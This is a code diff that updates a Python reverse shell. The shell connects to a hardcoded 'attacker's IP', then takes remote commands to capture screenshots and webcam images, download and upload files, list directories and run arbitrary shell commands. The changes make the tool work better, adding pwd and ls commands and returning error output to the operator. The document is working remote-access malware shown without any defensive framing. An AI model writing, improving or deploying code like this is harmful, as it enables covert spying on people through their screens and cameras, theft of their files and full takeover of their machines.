@@ -35,27 +35,27 @@ def receive_file(sock, file_path):
 
 def reverse_shell():
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('192.168.18.10', 8080))  # Replace with your attacker's IP and port
+    sock.connect(('192.168.100.91', 8080))  # Replace with your attacker's IP and port
 
     while True:
-        command = sock.recv(1024).decode()
+        command = sock.recv(1024).decode().strip()
         if command == 'exit':
             break
         elif command == 'desktop':
             img = pyautogui.screenshot()
-            img.save('screenshot.jpg', quality=90)  # Save as JPEG with quality 90
+            img.save('screenshot.jpg', quality=90)
             send_file(sock, 'screenshot.jpg')
         elif command == 'camera':
             cap = cv2.VideoCapture(0)
             ret, frame = cap.read()
-            cv2.imwrite('camera.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])  # Save as JPEG with quality 90
+            cv2.imwrite('camera.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
             cap.release()
             send_file(sock, 'camera.jpg')
         elif command.startswith('download'):
-            _, file_path = command.split()
+            _, file_path = command.split(maxsplit=1)
             send_file(sock, file_path)
         elif command.startswith('upload'):
-            _, file_path = command.split()
+            _, file_path = command.split(maxsplit=1)
             receive_file(sock, file_path)
         elif command.startswith('cd '):
             try:
@@ -64,12 +64,25 @@ def reverse_shell():
                 sock.sendall(f"Changed directory to {directory}\n".encode())
             except Exception as e:
                 sock.sendall(f"ERROR: {e}\n".encode())
+        elif command == 'pwd':
+            try:
+                cwd = os.getcwd()
+                sock.sendall((cwd + '\n').encode())
+            except Exception as e:
+                sock.sendall(f"ERROR: {e}\n".encode())
+        elif command == 'ls':
+            try:
+                files = os.listdir()
+                output = '\n'.join(files) + '\n'
+                sock.sendall(output.encode())
+            except Exception as e:
+                sock.sendall(f"ERROR: {e}\n".encode())
         else:
             try:
-                output = subprocess.check_output(command, shell=True)
+                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
                 sock.send(output)
             except subprocess.CalledProcessError as e:
-                sock.send(f"ERROR: {e}\n".encode())
+                sock.send(f"ERROR: {e.output.decode()}\n".encode())
 
     sock.close()
 
